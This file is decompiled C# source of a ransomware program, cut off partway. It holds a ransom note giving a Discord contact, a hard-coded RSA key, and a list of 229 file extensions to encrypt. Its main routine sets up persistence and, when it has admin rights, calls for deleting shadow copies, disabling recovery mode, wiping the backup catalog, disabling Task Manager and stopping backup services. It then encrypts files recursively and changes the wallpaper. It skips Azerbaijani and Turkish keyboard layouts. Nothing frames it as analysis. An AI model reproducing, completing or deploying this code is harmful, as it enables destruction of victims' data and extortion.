using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = false;

	private static string spreadName = "surprise";

	private static bool checkCopyRoaming = true;

	private static string processName = "windows.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	private static bool checkStopBackupServices = true;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"Your files have been encrypted.", "", "All your files like documents, photos, databases and other important stuff are encrypted", "", "You can send 1 of your encrypted file and i will decrypt it for free.", "", "You must follow these steps To decrypt your files :   ", "", "1) Contact me on discord- venity400 ", "",
		"2) Pay up"
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.CurrentInputLanguage.Culture.Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString().Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120u)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>1Sx9rVoIjN3NthKma8BcfiToA7xbAWuMCh/5H97w9gwgcfN4uIbRSzzCeTovBrJgZtaB9SVOsDyEzKXLfqKXUPu+XSAPCH3OKMspfIE6uGSMuh4IcDuKAYX8gbLdyjkqDGIT31wKCVLnlbdt/ws1xMws2Yh9Ug8XFFCoERnlnNoiv5eosFaDfE74QcdmEuacTpAqazZeP0mMGNbXh9SHoD03IC21hxef8SdxoLfW7rMAmyo61phRursiHDb9qR8BWdmQj51NlCDUoYnG60/bBPTf7b2M1WEkx48HdxTdJxQG8fbdDIlVAOk5hvQ8apv6VuJqHZLoIAn+JhZQvCyGYQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

